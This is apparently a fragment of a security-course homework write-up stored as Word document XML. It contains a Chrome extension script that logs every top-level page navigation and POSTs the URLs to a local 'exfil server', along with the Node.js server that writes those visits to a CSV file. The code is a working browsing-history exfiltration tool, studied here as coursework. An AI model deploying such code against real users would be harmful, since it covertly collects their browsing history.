      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>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Records top-level navigations and POSTs JSON to the exfil server.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Change EXFIL_URL if your Node server uses a different host/port.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EXFIL_URL = "http://127.0.0.1:3940/log";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chrome.webNavigation.onCommitted.addListener((details)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(details.frameId !== 0)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payload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time: Date.now(),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url: details.url,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tabId: details.tabId,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transitionType: details.transitionType,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fetch(EXFIL_URL,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method: "POST",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headers: { "Content-Type": "application/json"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body: JSON.stringify(payload),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mode: "cors",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keepalive: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}).catch(() =&gt; {});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68691C1B">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`server/server.js`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076ECE1B">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/**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Minimal HTTP server: POST /log appends one CSV line per visit.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 CSV columns: timestamp_iso,time_ms,url,tab_id,transition_type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http = require("http");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fs = require("fs");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path = require("path");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PORT = process.env.PORT ? Number(process.env.PORT) : 3940;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CSV_PATH = path.join(__dirname, "visits.csv");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ensureHeader()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(!fs.existsSync(CSV_PATH))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header = "timestamp_iso,time_ms,url,tab_id,transition_type\n";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fs.writeFileSync(CSV_PATH, header, "utf8");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csvEscape(value)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s = String(value ?? "");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(/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;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server = http.createServer((req, res)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res.setHeader("Access-Control-Allow-Origin", "*");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res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");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res.setHeader("Access-Control-Allow-Headers", "Content-Type");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(req.method === "OPTIONS")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res.writeHead(204);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res.end();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(req.method === "POST" &amp;&amp; req.url === "/log")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let body = "";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req.on("data", (c)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body += c;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req.on("end",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ensureHeader();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try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const j = JSON.parse(body);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const iso = new Date(j.time || Date.now()).toISOString();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const line =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csvEscape(iso),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csvEscape(j.time),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csvEscape(j.url),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csvEscape(j.tabId),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csvEscape(j.transitionType),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].join(",");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fs.appendFileSync(CSV_PATH, `${line}\n`, "utf8");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 catch (e)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console.error("Bad JSON", e.message);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res.writeHead(204);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res.end();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(req.method === "GET" &amp;&amp; req.url === "/health")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res.writeHead(200, { "Content-Type": "text/plain"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res.end("ok");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res.writeHead(404);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res.end();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server.listen(PORT, "0.0.0.0", () =&gt;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console.log(`Q3.1 server listening on http://127.0.0.1:${PORT}`);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console.log(`CSV file: ${CSV_PATH}`);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0E316CB0">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`server/package.json`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FED028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"hw2-q31-exfil-server",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"1.0.0",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"private":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"Receives browsing events from Q3.1 extension and appends to visits.csv",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"main": "server.js",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"scripts":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"start": "node server.js"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FC3CAEA">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>References (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F018B6">
      <w:r>
        <w:t xml:space="preserve">- Chrome Extensions documentation: https://developer.chrome.com/docs/extensions - Course HW2 PDF: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>14828_HW2_S26.pdf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - INI handbook (integrity): http://www.ini.cmu.edu/current_students/handbook/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6C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2557</Words>
  <Characters>35972</Characters>
  <Lines>0</Lines>
  <Paragraphs>0</Paragraphs>
  <TotalTime>0</TotalTime>
  <ScaleCrop>false</ScaleCrop>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>39302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Lord</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-25T04:28:35Z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eyJoZGlkIjoiYmMwM2JhMmQ0MDA3NGU5NzBiMDE4MzAxMmE3YzcxMmYiLCJ1c2VySWQiOiIzMzQwMDIifQ==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D324AF61A6E842F0BA24A5B8B4F7E672_12</vt:lpwstr>
  </property>
</Properties>
</file>